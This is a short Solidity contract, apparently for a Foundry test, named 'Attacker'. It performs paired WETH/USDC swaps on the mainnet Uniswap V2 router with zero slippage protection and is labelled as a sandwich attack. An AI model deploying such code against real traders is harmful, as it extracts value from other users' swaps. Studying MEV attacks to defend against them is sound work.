// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] memory path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 amount) external;
}

contract Attacker {
    IUniswapV2Router public Router =
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor() {
        USDC.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
    }

    function firstSwap(uint256 amount) external {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);
        console2.log("firstSwap: ", amount, WETH.balanceOf(address(this)));

        Router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp + 4200
        );
    }

    function secondSwap(uint256 amount) external {
        console2.log("secondSwap:", address(this));
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);

        //uint256 amount = USDC.balanceOf(address(this));
        Router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getUSDCBalance(
        address user
    ) external view returns (uint256 result) {
        return USDC.balanceOf(user);
    }

    function getWETHBalance(
        address user
    ) external view returns (uint256 result) {
        return WETH.balanceOf(user);
    }
}
// Sandwich
